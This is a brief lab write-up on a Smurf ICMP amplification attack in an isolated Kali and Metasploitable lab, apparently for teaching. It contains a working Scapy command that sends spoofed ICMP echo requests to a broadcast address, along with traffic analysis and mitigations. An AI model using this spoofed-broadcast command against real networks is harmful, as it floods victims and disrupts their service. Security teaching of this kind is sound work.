# Smurf Attack (ICMP Amplification -- DDoS)

## 1. Objective

The objective of this lab is to demonstrate a **Smurf attack**, a
Distributed Denial of Service (DDoS) technique based on ICMP
amplification.

The attacker sends ICMP Echo Request packets to a broadcast address
while spoofing the victim's IP address, causing traffic amplification.

## 2. Lab Environment

-   **Attacker machine:** Kali Linux
-   **Victim machine:** Metasploitable
-   **Network:** 192.168.43.0/24
-   **Tool used:** Scapy

## 3. Attack Steps

### a. Launch Scapy

``` bash
sudo scapy
```

### b. ICMP Smurf attack script

``` python
send(IP(src="192.168.43.22", dst="192.168.43.255")/ICMP(), count=100)
```

### c. Traffic analysis with Wireshark

Wireshark shows ICMP Echo Requests sent to the broadcast address and
multiple replies sent to the victim.

## 4. Impact of the Attack

The Smurf attack generates amplified ICMP traffic toward the victim,
potentially saturating bandwidth.

## 5. Mitigation Techniques

-   Disable IP-directed broadcasts
-   Block ICMP broadcast traffic
-   Filter spoofed packets
-   Deploy IDS systems

## 6. Conclusion

This lab illustrates how ICMP amplification attacks work and how proper
network configuration can mitigate them.
